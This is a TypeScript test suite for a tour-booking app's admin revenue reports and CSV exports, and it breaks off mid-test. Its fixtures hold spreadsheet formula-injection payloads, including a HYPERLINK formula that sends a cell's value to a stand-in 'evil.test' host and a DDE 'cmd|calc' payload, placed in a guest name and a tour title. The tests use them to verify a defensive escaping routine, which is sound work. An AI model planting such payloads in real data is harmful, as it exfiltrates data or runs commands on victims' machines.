/**
 * Week 7 plan, Task 12 — 7D: `admin.reports.*` and the CSV exports
 * (BUILD_SPEC §9 "Reports", §9's `reports` role row).
 *
 * **This suite READS money and writes none.** So what it pins is not a write
 * path but four definitions, every one of which is a sentence someone could
 * plausibly "correct" into a bug:
 *
 *  1. **Money received** is `type='payment' AND status='paid'` — so a
 *     `pending` cash claim and a `rejected` one count toward NOTHING. Both are
 *     rows a driver's tap or a guest's receipt really does create, and both
 *     would inflate a revenue figure if the predicate were loosened to "every
 *     payment row".
 *  2. **Refunds** are `type='refund' AND status='refunded'`, and they are
 *     POSITIVE rows (schema: direction comes from `type`, never a sign), so
 *     net received is a SUBTRACTION of two sums.
 *  3. **Still to collect does NOT subtract refunds.** A refund never
 *     decremented `amount_paid_centavos` in this codebase, so `total − paid`
 *     is untouched by one — which is correct, and is the single line this task
 *     is most likely to lose. It is pinned from both sides here: a refund
 *     leaves still-to-collect alone AND moves net received, in the same test
 *     data, so a "fix" that subtracted refunds from the balance cannot pass by
 *     making both figures agree.
 *  4. **Two buckets, not one** (owner decision 2026-10-23, Q7): money moves by
 *     the `payments` row's own `created_at` in Manila, bookings and balances by
 *     `bookings.tour_date`. The fixtures include a booking whose tour date is
 *     outside the window and whose payment is inside it, which is the only way
 *     to prove the two are read independently rather than from one join.
 *
 * ## The Manila boundary is tested from BOTH sides of midnight
 *
 * Manila is UTC+8, so the two instants that matter are `16:30Z` (00:30 Manila
 * the NEXT day) and `15:30Z` (23:30 Manila the SAME day). A UTC-based range
 * would put the first in the wrong day and the second in the right one, so a
 * test that only used the brief's own `23:30 Manila = 15:30 UTC` example would
 * pass against a broken implementation. Both are here, on their own booking in
 * a month of their own, so the main month's arithmetic stays readable.
 *
 * ## Fixtures live in 2098, and are inserted directly
 *
 * These procedures aggregate over the WHOLE table for a date range, so the
 * fixtures have to be the only rows in their window: every date here is in
 * 2098, a year no other suite uses (the far-future convention in this
 * project is 2099, deliberately avoided).
 *
 * The `payments` rows are written with Drizzle rather than through
 * `recordPayment()`, which every write-path suite rightly uses. The reason is
 * the thing under test: `recordPayment` stamps `created_at` from the real
 * clock, and `created_at` IS the bucket. `amount_paid_centavos` is likewise
 * set in the fixture rather than credited by the service — the two buckets are
 * independent by design, and this file's job is to prove that, so the fixture
 * states each one outright instead of deriving it.
 */
import { readFileSync } from 'node:fs';
import { resolve } from 'node:path';
import { afterAll, beforeAll, expect, it } from 'vitest';
import {
  dateRangeInput,
  reportCsvInput,
  type AdminRole,
  type BookingStatus,
  type PriceSnapshot,
} from '@rg/shared';
import { getDb, getPool } from '../db/client';
import { bookings, destinations, payments, tours, users } from '../db/schema';
import { ROLE_MATRIX } from '../middleware/require-role';
import { appRouter } from '../routers/_app';
import { generateBookingRef } from '../services/booking-ref';
import {
  byTourCsv,
  csvField,
  csvText,
  outstandingCsv,
  pesosFromCentavos,
  toCsv,
} from '../services/reports/csv';
import { staffContext } from './helpers/ctx';
import { describeWithDb } from './helpers/db';

/* -------------------------------------------------------------------------
 * Pure guards — no database.
 * ---------------------------------------------------------------------- */

const MOUNTED_PATHS = [
  'admin.reports.summary',
  'admin.reports.byTour',
  'admin.reports.outstanding',
  'admin.reports.csv',
] as const;

it('declares §9’s reports gate on all four mounted procedures', () => {
  const mounted = (
    appRouter as unknown as {
      _def: { procedures: Record<string, { _def?: { meta?: unknown } }> };
    }
  )._def.procedures;
  for (const path of MOUNTED_PATHS) {
    expect(mounted[path], `${path} is not mounted`).toBeDefined();
    expect(mounted[path]?._def?.meta).toMatchObject({
      access: 'admin',
      area: 'reports',
      roles: ROLE_MATRIX.reports,
    });
  }
});

/**
 * Blank out comment spans before matching, so prose ABOUT the rule does not
 * trip the rule — all three new files SAY they write no audit row, and a guard
 * that punished the explanation would get the explanation deleted. Lifted from
 * `admin-refunds.test.ts`, which lifted it from `schema-conventions.test.ts`:
 * block comments are blanked character-by-character so line numbers stay
 * stable, and `//` only starts a line comment when not preceded by `:`.
 */
function stripComments(text: string): string {
  const withoutBlockComments = text.replace(/\/\*[\s\S]*?\*\//g, (match) =>
    match.replace(/[^\n]/g, ' '),
  );
  return withoutBlockComments.replace(/(^|[^:])\/\/.*$/gm, (_match, prefix: string) => prefix);
}

/** A CALL to the audit writer, not a mention of its name. */
const AUDIT_CALL = /\bwriteAudit\s*\(/;

/**
 * A read-only report writes NO audit row (CLAUDE.md Global Constraints:
 * "Reports and read-only screens write no audit rows").
 *
 * A source scan, because the claim is about what these files cannot do. The
 * behavioural half — the `audit_log` row count being unchanged by all four
 * calls — is below with the database tests; this half catches an audit write
 * added on a path the fixtures happen not to reach.
 */
it('never writes an audit row from any of the three new server files', () => {
  const root = resolve(import.meta.dirname, '..');
  const files = [
    'services/reports/money.ts',
    'services/reports/csv.ts',
    'routers/admin/reports.ts',
  ];
  // The vacuity half: prove the pattern still matches a known violation, so a
  // typo in it cannot make `not.toMatch` pass forever.
  expect(AUDIT_CALL.test('await writeAudit(tx, { action: "x" });')).toBe(true);
  for (const file of files) {
    const source = stripComments(readFileSync(resolve(root, file), 'utf8'));
    expect(source.length, `${file} is empty`).toBeGreaterThan(0);
    expect(source, `${file} must not write audit rows`).not.toMatch(AUDIT_CALL);
  }
});

it('refuses an inverted date range rather than answering it with zeros', () => {
  expect(dateRangeInput.safeParse({ from: '2098-03-01', to: '2098-03-31' }).success).toBe(true);
  expect(dateRangeInput.safeParse({ from: '2098-03-31', to: '2098-03-01' }).success).toBe(false);
  // Equal ends are a single day, which is a legitimate report.
  expect(dateRangeInput.safeParse({ from: '2098-03-01', to: '2098-03-01' }).success).toBe(true);
  // And the CSV input carries the same refusal, not just the three queries.
  expect(
    reportCsvInput.safeParse({ from: '2098-03-31', to: '2098-03-01', report: 'summary' }).success,
  ).toBe(false);
  expect(
    reportCsvInput.safeParse({ from: '2098-03-01', to: '2098-03-01', report: 'nope' }).success,
  ).toBe(false);
});

/* -------------------------------------------------------------------------
 * The CSV helper, tested directly (not only through a report).
 * ---------------------------------------------------------------------- */

it('quotes only the fields RFC 4180 requires quoting, and doubles inner quotes', () => {
  expect(csvField('Sirao Flower Farm')).toBe('Sirao Flower Farm');
  expect(csvField('')).toBe('');
  expect(csvField('Kawasan Falls, Badian')).toBe('"Kawasan Falls, Badian"');
  expect(csvField('He said "hi"')).toBe('"He said ""hi"""');
  expect(csvField('line one\nline two')).toBe('"line one\nline two"');
  expect(csvField('line one\r\nline two')).toBe('"line one\r\nline two"');
});

it('writes a header row and CRLF line endings', () => {
  const csv = toCsv(
    ['Ref', 'Tour'],
    [
      ['RG-AAA111', 'Kawasan Falls, Badian'],
      ['RG-BBB222', 'Sirao'],
    ],
  );
  expect(csv.split('\r\n')).toEqual([
    'Ref,Tour',
    'RG-AAA111,"Kawasan Falls, Badian"',
    'RG-BBB222,Sirao',
  ]);
});

it('renders centavos as pesos with two decimals and no currency glyph', () => {
  expect(pesosFromCentavos(150_000)).toBe('1500.00');
  expect(pesosFromCentavos(0)).toBe('0.00');
  expect(pesosFromCentavos(1_234)).toBe('12.34');
  expect(pesosFromCentavos(-20_000)).toBe('-200.00');
  expect(pesosFromCentavos(-1)).toBe('-0.01');
});

/* -------------------------------------------------------------------------
 * CSV formula injection — the failure path.
 *
 * RFC quoting is about the FILE; this is about the READER. Excel and Sheets
 * evaluate a cell beginning `=`, `+`, `-` or `@` as a formula, so a guest whose
 * name at checkout is `=HYPERLINK("http://evil/?l="&A2,"Click")` writes a live,
 * clickable link into the spreadsheet an owner opens, with the row beside it as
 * its argument. `csvText()` is the control; it is applied to text cells ONLY,
 * and the test below that a `-200.00` overpayment survives untouched is what
 * makes that distinction load-bearing rather than a comment.
 * ---------------------------------------------------------------------- */

it('neutralises every character a spreadsheet reads as the start of a formula', () => {
  expect(csvText('=HYPERLINK("http://evil.test",A2)')).toBe('\'=HYPERLINK("http://evil.test",A2)');
  expect(csvText('+1+1')).toBe("'+1+1");
  expect(csvText('-2+3+cmd|calc')).toBe("'-2+3+cmd|calc");
  expect(csvText('@SUM(A1:A9)')).toBe("'@SUM(A1:A9)");
  // A leading TAB or CR is consumed before the parse, so `\t=cmd` is `=cmd` by
  // the time the cell is evaluated.
  expect(csvText('\t=cmd')).toBe("'\t=cmd");
  expect(csvText('\r=cmd')).toBe("'\r=cmd");
});

it('leaves a value that is not a formula exactly as it was', () => {
  expect(csvText('Maria Santos')).toBe('Maria Santos');
  expect(csvText('')).toBe('');
  expect(csvText('Kawasan Falls, Badian Day Tour')).toBe('Kawasan Falls, Badian Day Tour');
  // Not at the START is not a formula, and must not be mangled.
  expect(csvText('Jun Dela Cruz (A=B)')).toBe('Jun Dela Cruz (A=B)');
  expect(csvText('RG-7KQ4M9')).toBe('RG-7KQ4M9');
});

it('prefixes a hostile tour title and guest name but never a negative amount', () => {
  const byTour = byTourCsv([
    {
      tourId: 1,
      tourTitle: '=HYPERLINK("http://evil.test",A2)',
      receivedCentavos: 0,
      refundedCentavos: 0,
      netReceivedCentavos: 0,
      stillToCollectCentavos: -20_000,
      bookingCount: 1,
    },
  ]);
  expect(byTour.split('\r\n')[1]).toBe(
    '"\'=HYPERLINK(""http://evil.test"",A2)",1,0.00,0.00,0.00,-200.00',
  );

  const outstanding = outstandingCsv([
    {
      bookingId: 1,
      ref: 'RG-7KQ4M9',
      tourTitle: '@SUM(A1:A9)',
      tourDate: '2098-09-04',
      status: 'confirmed',
      leadName: '-2+3+cmd|calc',
      totalCentavos: 100_000,
      paidCentavos: 120_000,
      outstandingCentavos: -20_000,
    },
  ]);
  /*
   * The two text cells carry the apostrophe; the overpayment keeps its minus
   * sign and stays a number. A control applied field-blind would have written
   * `'-200.00` here and corrupted a real figure, which is the whole reason
   * `csvText` is separate from `csvField`.
   */
  expect(outstanding.split('\r\n')[1]).toBe(
    "RG-7KQ4M9,2098-09-04,'@SUM(A1:A9),'-2+3+cmd|calc,confirmed,1000.00,1200.00,-200.00",
  );
});

/* -------------------------------------------------------------------------
 * Fixtures.
 * ---------------------------------------------------------------------- */

const unique = () => `${Math.floor(Math.random() * 1e9)}-${Date.now()}`;

/** The window every headline assertion below is made over. */
const MARCH = { from: '2098-03-01', to: '2098-03-31' } as const;
/** A month with nothing in it at all. */
const EMPTY_MONTH = { from: '2098-07-01', to: '2098-07-31' } as const;

/**
 * A month holding ONE booking, whose tour title and guest name are both
 * spreadsheet formulas. Its own window so March's arithmetic stays readable.
 */
const HOSTILE_MONTH = { from: '2098-09-01', to: '2098-09-30' } as const;

/** A tour title with a comma in it — the CSV escaping test's material. */
const TITLE_WITH_COMMA = 'Kawasan Falls, Badian Day Tour';

/**
 * A tour title that is a DDE payload, starting with `-`, and a guest name that
 * is a live hyperlink, starting with `=` and carrying a comma and quotes so the
 * formula prefix and the RFC quoting have to compose.
 *
 * A tour title is admin-entered, so this one is the less likely of the two —
 * but it reaches the same spreadsheet, and "only the guest field is hostile" is
 * an assumption rather than a control.
 */
const HOSTILE_TITLE = "-2+3+cmd|' /C calc'!A0";
const HOSTILE_NAME = '=HYPERLINK("http://evil.test/?c="&A2,"Click")';

const SNAPSHOT: PriceSnapshot = {
  tier: { tierId: 1, minPax: 1, maxPax: 12, pricePerPersonCentavos: 100_000 },
  addons: [],
  coupon: null,
  depositPercent: 30,
  freeCancelHours: 48,
  subtotalCentavos: 100_000,
  discountCentavos: 0,
  totalCentavos: 100_000,
};

const created = {
  bookingIds: [] as number[],
  paymentIds: [] as number[],
  tourIds: [] as number[],
  destIds: [] as number[],
  userIds: [] as number[],
};

const tourIds: Record<'a' | 'b' | 'c' | 'hostile', number> = { a: 0, b: 0, c: 0, hostile: 0 };
const bookingIds: Record<string, number> = {};
let owner = 0;
let dispatcher = 0;
let finance = 0;

const apiFor = (userId: number, role: AdminRole) =>
  appRouter.createCaller(staffContext(userId, role) as never);
const ownerApi = () => apiFor(owner, 'owner');

async function makeStaff(role: AdminRole): Promise<number> {
  const suffix = unique();
  const [row] = await getDb()
    .insert(users)
    .values({
      name: `Reports ${role} ${suffix}`,
      email: `reports_${role}_${suffix}@example.test`,
      passwordHash: '__reports_fixture_not_a_hash__',
      role,
      isActive: true,
    });
  created.userIds.push(row.insertId);
  return row.insertId;
}

async function makeTour(title: string): Promise<number> {
  const slug = `__adminreports__${unique()}`;
  const [destination] = await getDb().insert(destinations).values({ name: slug, slug });
  created.destIds.push(destination.insertId);
  const [tour] = await getDb()
    .insert(tours)
    .values({ slug, title, destinationId: destination.insertId, isActive: true });
  created.tourIds.push(tour.insertId);
  return tour.insertId;
}

async function makeBooking(spec: {
  tourId: number;
  tourDate: string;
  totalCentavos: number;
  paidCentavos: number;
  status: BookingStatus;
  /** Guest-entered at checkout, so the one field an attacker fills directly. */
  leadName?: string;
}): Promise<number> {
  const [row] = await getDb()
    .insert(bookings)
    .values({
      ref: generateBookingRef(),
      tourId: spec.tourId,
      tourDate: new Date(`${spec.tourDate}T00:00:00Z`),
      pax: 2,
      leadName: spec.leadName ?? 'Reports Fixture Guest',
      leadEmail: 'admin-reports@example.test',
      leadPhone: '09171234567',
      status: spec.status,
      payMode: 'deposit',
      priceSnapshot: SNAPSHOT,
      subtotalCentavos: spec.totalCentavos,
      totalCentavos: spec.totalCentavos,
      /*
       * Set in the fixture rather than credited through `recordPayment()`,
       * because the two buckets this file tests are independent by design and
       * each is stated outright. Spelling the Drizzle key here is allowed:
       * `schema-conventions.test.ts`'s crediting-writer scan reads application
       * source only and excludes `__tests__`.
       */
      amountPaidCentavos: spec.paidCentavos,
      paymentReviewRequired: false,
      holdExpiresAt: null,
    });
  created.bookingIds.push(row.insertId);
  return row.insertId;
}

async function makePayment(spec: {
  bookingId: number;
  type: 'payment' | 'refund';
  status: 'pending' | 'paid' | 'rejected' | 'refunded';
  amountCentavos: number;
  /** The UTC instant. This IS the bucket under test. */
  createdAt: string;
}): Promise<number> {
  const at = new Date(spec.createdAt);
  const [row] = await getDb().insert(payments).values({
    bookingId: spec.bookingId,
    type: spec.type,
    provider: 'manual',
    method: 'cash',
    amountCentavos: spec.amountCentavos,
    status: spec.status,
    createdAt: at,
    updatedAt: at,
  });
  created.paymentIds.push(row.insertId);
  return row.insertId;
}

async function auditRowCount(): Promise<number> {
  const [rows] = (await getPool().query('SELECT COUNT(*) n FROM audit_log')) as unknown as [
    Array<{ n: number }>,
    unknown,
  ];
  return Number(rows[0]?.n ?? -1);
}

describeWithDb('admin.reports', () => {
  beforeAll(async () => {
    owner = await makeStaff('owner');
    dispatcher = await makeStaff('dispatcher');
    finance = await makeStaff('finance');

    tourIds.a = await makeTour(TITLE_WITH_COMMA);
    tourIds.b = await makeTour('Sirao Flower Farm Half Day');
    tourIds.c = await makeTour('Olango Island Hopping');
    tourIds.hostile = await makeTour(HOSTILE_TITLE);

    /*
     * March, tour A: one part-paid booking and one fully-paid one. The
     * part-paid one is also the one that gets refunded, which is what makes
     * "a refund moved net received and left the balance alone" a statement
     * about ONE booking rather than two.
     */
    bookingIds.b1 = await makeBooking({
      tourId: tourIds.a,
      tourDate: '2098-03-05',
      totalCentavos: 300_000,
      paidCentavos: 100_000,
      status: 'confirmed',
    });
    bookingIds.b2 = await makeBooking({
      tourId: tourIds.a,
      tourDate: '2098-03-06',
      totalCentavos: 200_000,
      paidCentavos: 200_000,
      status: 'completed',
    });
    /* March, tour B: nothing paid, cancelled, and overpaid. */
    bookingIds.b3 = await makeBooking({
      tourId: tourIds.b,
      tourDate: '2098-03-07',
      totalCentavos: 500_000,
      paidCentavos: 0,
      status: 'pending_payment',
    });
    bookingIds.b4 = await makeBooking({
      tourId: tourIds.b,
      tourDate: '2098-03-08',
      totalCentavos: 400_000,
      paidCentavos: 150_000,
      status: 'cancelled',
    });
    bookingIds.b6 = await makeBooking({
      tourId: tourIds.b,
      tourDate: '2098-03-09',
      totalCentavos: 100_000,
      paidCentavos: 120_000,
      status: 'confirmed',
    });
    /*
     * Tour C, APRIL tour date, paid for in March. The booking belongs to no
     * March bucket; its payment belongs to March's money. Nothing else in
     * this file can tell the two buckets apart.
     */
    bookingIds.b5 = await makeBooking({
      tourId: tourIds.c,
      tourDate: '2098-04-02',
      totalCentavos: 100_000,
      paidCentavos: 70_000,
      status: 'confirmed',
    });
    /* The boundary booking, in a month of its own. */
    bookingIds.b7 = await makeBooking({
      tourId: tourIds.c,
      tourDate: '2098-06-01',
      totalCentavos: 33_000,
      paidCentavos: 33_000,
      status: 'completed',
    });
    /*
     * September, in a month of its own: one part-paid booking whose tour title
     * and guest name are both spreadsheet formulas. The guest name is the real
     * attack surface — it is typed at checkout — and the title is here because
     * it reaches the same file.
     */
    bookingIds.hostile = await makeBooking({
      tourId: tourIds.hostile,
      tourDate: '2098-09-04',
      totalCentavos: 100_000,
      paidCentavos: 25_000,
      status: 'confirmed',
      leadName: HOSTILE_NAME,
    });

    await makePayment({
      bookingId: bookingIds.b1,
      type: 'payment',
      status: 'paid',
      amountCentavos: 100_000,
      createdAt: '2098-03-05T02:00:00Z',
    });
    await makePayment({
      bookingId: bookingIds.b2,
      type: 'payment',
      status: 'paid',
      amountCentavos: 200_000,
      createdAt: '2098-03-06T02:00:00Z',
    });
    /* The refund. Positive, as the schema requires. */
    await makePayment({
      bookingId: bookingIds.b1,
      type: 'refund',
      status: 'refunded',
      amountCentavos: 40_000,
      createdAt: '2098-03-20T02:00:00Z',
    });
    /* A driver's cash CLAIM, not yet verified. Counts toward nothing. */
    await makePayment({
      bookingId: bookingIds.b3,
      type: 'payment',
      status: 'pending',
      amountCentavos: 500_000,
      createdAt: '2098-03-07T02:00:00Z',
    });
    /* A claim finance REFUSED — "the money never arrived". Also nothing. */
    await makePayment({
      bookingId: bookingIds.b3,
      type: 'payment',
      status: 'rejected',
      amountCentavos: 500_000,
      createdAt: '2098-03-07T03:00:00Z',
    });
    await makePayment({
      bookingId: bookingIds.b5,
      type: 'payment',
      status: 'paid',
      amountCentavos: 70_000,
      createdAt: '2098-03-25T02:00:00Z',
    });
    /* 16:30Z on the 14th = 00:30 Manila on the 15th. */
    await makePayment({
      bookingId: bookingIds.b7,
      type: 'payment',
      status: 'paid',
      amountCentavos: 11_000,
      createdAt: '2098-05-14T16:30:00Z',
    });
    /* 15:30Z on the 15th = 23:30 Manila on the 15th. */
    await makePayment({
      bookingId: bookingIds.b7,
      type: 'payment',
      status: 'paid',
      amountCentavos: 22_000,
      createdAt: '2098-05-15T15:30:00Z',
    });
  }, 30_000);

  afterAll(async () => {
    const pool = getPool();
    for (const id of created.bookingIds) {
      await pool.query('DELETE FROM payments WHERE booking_id = ?', [id]);
      await pool.query('DELETE FROM bookings WHERE id = ?', [id]);
    }
    for (const id of created.tourIds) await pool.query('DELETE FROM tours WHERE id = ?', [id]);
    for (const id of created.destIds) {
      await pool.query('DELETE FROM destinations WHERE id = ?', [id]);
    }
    for (const id of created.userIds) {
      await pool.query('DELETE FROM sessions WHERE subject_type = ? AND subject_id = ?', [
        'user',
        id,
      ]);
      await pool.query('DELETE FROM users WHERE id = ?', [id]);
    }
  }, 30_000);

  /* ------------------------------------------------------------- The roles */

  it('refuses a dispatcher on all four procedures with FORBIDDEN', async () => {
    const api = apiFor(dispatcher, 'dispatcher');
    /*
     * Asserted on `code`, never on the message — the pattern every other
     * admin suite here follows, because `requireRole()`'s sentence names
     * neither status and a regex on prose can pass against broken code.
     */
    const refusals = await Promise.all([
      api.admin.reports.summary(MARCH).catch((e: unknown) => e),
      api.admin.reports.byTour(MARCH).catch((e: unknown) => e),
      api.admin.reports.outstanding(MARCH).catch((e: unknown) => e),
      api.admin.reports.csv({ ...MARCH, report: 'summary' }).catch((e: unknown) => e),
    ]);
    expect(refusals).toHaveLength(4);
    for (const refusal of refusals) {
      expect(refusal).toMatchObject({ code: 'FORBIDDEN' });
    }
  });

  it('admits finance as well as the owner', async () => {
    const asFinance = await apiFor(finance, 'finance').admin.reports.summary(MARCH);
    const asOwner = await ownerApi().admin.reports.summary(MARCH);
    expect(asFinance).toEqual(asOwner);
  });

  /* ----------------------------------------------------------- The summary */

  it('sums only paid payments and refunded refunds, and nets one against the other', async () => {
    const summary = await ownerApi().admin.reports.summary(MARCH);
    // 100,000 + 200,000 (tour A) + 70,000 (tour C, April trip, March money).
    expect(summary.receivedCentavos).toBe(370_000);
    expect(summary.refundedCentavos).toBe(40_000);
    expect(summary.netReceivedCentavos).toBe(330_000);
    expect(summary.from).toBe(MARCH.from);
    expect(summary.to).toBe(MARCH.to);
  });

  it('counts neither a pending cash claim nor a rejected one as money', async () => {
    const summary = await ownerApi().admin.reports.summary(MARCH);
    /*
     * Both of b3's rows are ₱5,000 and both are in the window. If either
     * counted, `received` would be 870,000 or 1,370,000 rather than 370,000
     * — and b3's balance would be wrong too, which the next test covers.
     */
    expect(summary.receivedCentavos).toBe(370_000);
    expect(summary.refundedCentavos).toBe(40_000);
  });

  it('does NOT let a refund reduce still to collect', async () => {
    const summary = await ownerApi().admin.reports.summary(MARCH);
    /*
     * b1 200,000 + b2 0 + b3 500,000 + b6 −20,000 = 680,000, and b4 is
     * cancelled so it owes nothing. b1 was refunded ₱400 in this same window
     * and that refund is NOT here: a refund is a separate positive `payments`
     * row and never a subtraction from `amount_paid_centavos`, so the balance
     * a guest owes is untouched by one. Subtracting the 40,000 would give
     * 640,000 and this is the assertion that says so.
     */
    expect(summary.stillToCollectCentavos).toBe(680_000);
  });

  it('does let the same refund reduce net received', async () => {
    const summary = await ownerApi().admin.reports.summary(MARCH);
    expect(summary.netReceivedCentavos).toBe(summary.receivedCentavos - 40_000);
  });

  it('counts every booking on the tour dates, cancellations included', async () => {
    const summary = await ownerApi().admin.reports.summary(MARCH);
    // b1, b2, b3, b4 (cancelled) and b6. b5 and b7 are on other months.
    expect(summary.bookingCount).toBe(5);
  });

  it('answers an empty window with zeros, not nulls', async () => {
    const summary = await ownerApi().admin.reports.summary(EMPTY_MONTH);
    expect(summary).toEqual({
      from: EMPTY_MONTH.from,
      to: EMPTY_MONTH.to,
      receivedCentavos: 0,
      refundedCentavos: 0,
      netReceivedCentavos: 0,
      stillToCollectCentavos: 0,
      bookingCount: 0,
    });
    expect(await ownerApi().admin.reports.byTour(EMPTY_MONTH)).toEqual([]);
    expect(await ownerApi().admin.reports.outstanding(EMPTY_MONTH)).toEqual([]);
  });

  /* ------------------------------------------------------- Manila bucketing */

  it('buckets a payment by its MANILA day, not its UTC one', async () => {
    const api = ownerApi();
    /*
     * 2098-05-14T16:30Z is 00:30 Manila on the 15th, and 2098-05-15T15:30Z is
     * 23:30 Manila on the 15th. Both belong to the 15th; neither belongs to
     * the UTC day its instant falls in, and a range built on UTC days would
     * put the first on the 14th.
     */
    const fifteenth = await api.admin.reports.summary({ from: '2098-05-15', to: '2098-05-15' });
    expect(fifteenth.receivedCentavos).toBe(33_000);

    const fourteenth = await api.admin.reports.summary({ from: '2098-05-14', to: '2098-05-14' });
    expect(fourteenth.receivedCentavos).toBe(0);

    const sixteenth = await api.admin.reports.summary({ from: '2098-05-16', to: '2098-05-16' });
    expect(sixteenth.receivedCentavos).toBe(0);
  });

  /* ------------------------------------------------------------- By tour */

  it('splits the figures per tour, over the union of both buckets', async () => {
    const rows = await ownerApi().admin.reports.byTour(MARCH);
    const byId = new Map(rows.map((row) => [row.tourId, row]));

    expect(byId.get(tourIds.a)).toEqual({
      tourId: tourIds.a,
      tourTitle: TITLE_WITH_COMMA,
      receivedCentavos: 300_000,
      refundedCentavos: 40_000,
      netReceivedCentavos: 260_000,
      stillToCollectCentavos: 200_000,
      bookingCount: 2,
    });
    expect(byId.get(tourIds.b)).toEqual({
      tourId: tourIds.b,
      tourTitle: 'Sirao Flower Farm Half Day',
      receivedCentavos: 0,
      refundedCentavos: 0,
      netReceivedCentavos: 0,
      stillToCollectCentavos: 480_000,
      bookingCount: 3,
    });
    /*
     * Tour C is in this report ONLY because money moved against it in March.
     * Its one booking is an April trip, so it contributes no count and no
     * balance — a tour that a single join on `tour_date` would have dropped
     * entirely, taking ₱700 of real revenue with it.
     */
    expect(byId.get(tourIds.c)).toEqual({
      tourId: tourIds.c,
      tourTitle: 'Olango Island Hopping',
      receivedCentavos: 70_000,
      refundedCentavos: 0,
      netReceivedCentavos: 70_000,
      stillToCollectCentavos: 0,
      bookingCount: 0,
    });
  });

  it('adds up to the summary', async () => {
    const api = ownerApi();
    const [summary, rows] = await Promise.all([
      api.admin.reports.summary(MARCH),
      api.admin.reports.byTour(MARCH),
    ]);
    const total = (key: 'receivedCentavos' | 'refundedCentavos' | 'stillToCollectCentavos') =>
      rows.reduce((sum, row) => sum + row[key], 0);
    expect(total('receivedCentavos')).toBe(summary.receivedCentavos);
    expect(total('refundedCentavos')).toBe(summary.refundedCentavos);
    expect(total('stillToCollectCentavos')).toBe(summary.stillToCollectCentavos);
    expect(rows.reduce((sum, row) => sum + row.bookingCount, 0)).toBe(summary.bookingCount);
  });

  /* --------------------------------------------------------- Outstanding */

  it('lists every booking that does not add up, and nothing that does', async () => {
    const rows = await ownerApi().admin.reports.outstanding(MARCH);
    expect(rows.map((row) => row.bookingId)).toEqual([bookingIds.b1, bookingIds.b3, bookingIds.b6]);
    expect(rows.map((row) => row.outstandingCentavos)).toEqual([200_000, 500_000, -20_000]);
    expect(rows[0]).toMatchObject({
      tourTitle: TITLE_WITH_COMMA,
      tourDate: '2098-03-05',
      status: 'confirmed',
      totalCentavos: 300_000,
      paidCentavos: 100_000,
    });
    // b2 is square and b4 is cancelled; neither is a balance to chase.
    expect(rows.some((row) => row.bookingId === bookingIds.b2)).toBe(false);
    expect(rows.some((row) => row.bookingId === bookingIds.b4)).toBe(false);
  });

  it('sums to the summary’s still-to-collect figure', async () => {
    const api = ownerApi();
    const [summary, rows] = await Promise.all([
      api.admin.reports.summary(MARCH),
      api.admin.reports.outstanding(MARCH),
    ]);
    expect(rows.reduce((sum, row) => sum + row.outstandingCentavos, 0)).toBe(
      summary.stillToCollectCentavos,
    );
  });

  /* ---------------------------------------------------------------- CSV */

  it('exports the by-tour report with a header row, quoted titles and no raw centavos', async () => {
    const { filename, csv } = await ownerApi().admin.reports.csv({ ...MARCH, report: 'byTour' });
    expect(filename).toBe('travelsugbo-by-tour-2098-03-01-to-2098-03-31.csv');

    const lines = csv.split('\r\n');
    expect(lines[0]).toBe(
      'Tour,Bookings,Received (PHP),Refunds (PHP),Net received (PHP),Still to collect (PHP)',
    );
    // The comma in the title is quoted, so the row still has six fields.
    expect(lines[1]).toBe(`"${TITLE_WITH_COMMA}",2,3000.00,400.00,2600.00,2000.00`);

    /*
     * No raw centavos anywhere: the file a person opens in a spreadsheet
     * carries pesos. 300000 is tour A's received figure in centavos and must
     * not appear; 3000.00 is the same money in pesos and must.
     */
    expect(csv).not.toMatch(/\b300000\b/);
    expect(csv).toContain('3000.00');
  });

  it('exports the summary and outstanding reports too', async () => {
    const api = ownerApi();
    const summary = await api.admin.reports.csv({ ...MARCH, report: 'summary' });
    expect(summary.filename).toBe('travelsugbo-summary-2098-03-01-to-2098-03-31.csv');
    const summaryLines = summary.csv.split('\r\n');
    expect(summaryLines[0]).toBe('Figure,Amount (PHP)');
    expect(summary.csv).toContain('Net received,3300.00');
    expect(summary.csv).toContain('Still to collect,6800.00');
    // The booking COUNT is not pesos, and is not dressed up as money.
    expect(summary.csv).toContain('Bookings,5');

    const outstanding = await api.admin.reports.csv({ ...MARCH, report: 'outstanding' });
    expect(outstanding.filename).toBe('travelsugbo-outstanding-2098-03-01-to-2098-03-31.csv');
    expect(outstanding.csv.split('\r\n')[0]).toBe(
      'Booking,Tour date,Tour,Guest,Status,Total (PHP),Paid (PHP),Outstanding (PHP)',
    );
    expect(outstanding.csv).toContain(`"${TITLE_WITH_COMMA}"`);
    expect(outstanding.csv).toContain('3000.00,1000.00,2000.00');
    expect(outstanding.csv).not.toMatch(/\b200000\b/);
  });

  /**
   * The failure path, end to end: a guest name typed at checkout and a tour
   * title entered in the admin, both spreadsheet formulas, both reaching a real
   * export through the real procedure.
   *
   * The unit tests above pin `csvText` itself; this pins that the procedure
   * actually calls it on the cells that carry attacker-reachable text, which no
   * amount of unit testing of the helper can say.
   */
  it('neutralises a formula in a guest name and a tour title in the real exports', async () => {
    const api = ownerApi();
    const rows = await api.admin.reports.outstanding(HOSTILE_MONTH);
    expect(rows).toHaveLength(1);
    const row = rows[0]!;
    // The PAYLOAD is the raw text — the mitigation belongs to the file, not to
    // the API, and a screen that rendered an apostrophe would be wrong.
    expect(row.leadName).toBe(HOSTILE_NAME);
    expect(row.tourTitle).toBe(HOSTILE_TITLE);

    const outstanding = await api.admin.reports.csv({ ...HOSTILE_MONTH, report: 'outstanding' });
    expect(outstanding.csv.split('\r\n')[1]).toBe(
      [
        row.ref,
        '2098-09-04',
        // Starts `-`: prefixed, and needs no quoting (no comma or quote in it).
        `'${HOSTILE_TITLE}`,
        // Starts `=` AND carries a comma and quotes: prefixed, then quoted,
        // with every inner quote doubled. Both escapes, composed.
        '"\'=HYPERLINK(""http://evil.test/?c=""&A2,""Click"")"',
        'confirmed',
        '1000.00',
        '250.00',
        '750.00',
      ].join(','),
    );

    const byTour = await api.admin.reports.csv({ ...HOSTILE_MONTH, report: 'byTour' });
    expect(byTour.csv.split('\r\n')[1]).toBe(`'${HOSTILE_TITLE},1,0.00,0.00,0.00,750.00`);

    /*
     * And the property, scanned rather than reasoned about: no field in either
     * file begins with `=`, `+` or `@`, inside quotes or out. `-` is excluded
     * because a peso cell legitimately begins with one, which is exactly the
     * distinction `csvText` exists to respect.
     */
    const startsFormula = /(?:^|,)"?[=+@]/m;
    // The vacuity half: the same row as it would look with no mitigation.
    const unmitigated = `RG-AAA111,2098-09-04,"=HYPERLINK(""x"")"`;
